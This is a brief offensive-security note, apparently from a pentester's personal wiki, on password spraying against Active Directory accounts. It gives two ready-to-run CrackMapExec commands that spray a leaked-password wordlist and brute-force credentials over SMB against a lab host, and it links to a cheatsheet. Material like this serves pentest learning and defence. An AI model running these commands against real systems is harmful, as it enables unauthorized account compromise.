# **Password Spraying Attack**

In this attack we simply Brute-force Password on user accounts to see if there is any weak password or dictionary Passwords there.

There is also Account Lockout Policies which will prevent these Password Spraying attacks, like 5 Login Attempts in 30 Minutes.

# **Attacking**

[CrackMapExec](Active_Directory_Enumeration--PowerView--Commands--Get-NetGroup_16.html) can use to perform The Password Spray Attack on Active Directory User Accounts.

**Commands**:

Brute-forcing passwords on all the users mentioned in the file users.txt

```
crackmapexec smb 192.168.0.47 -u users.txt -p /media/kali/Ex-Disk/Wordlists/SecLists/Passwords/darkweb2017-top1000.txt --continue-on-success | grep "+"
```

## **Bruteforce Username and Passwords with CrackMapExec**

```
crackmapexec -t 50 smb 192.168.0.47 -u users.txt -p passwords.txt
```

**[CrackMapExec](Active_Directory_Enumeration--PowerView--Commands--Get-NetGroup_16.html)** **CHEATSHEET: ⇒** 
[https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/](https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/)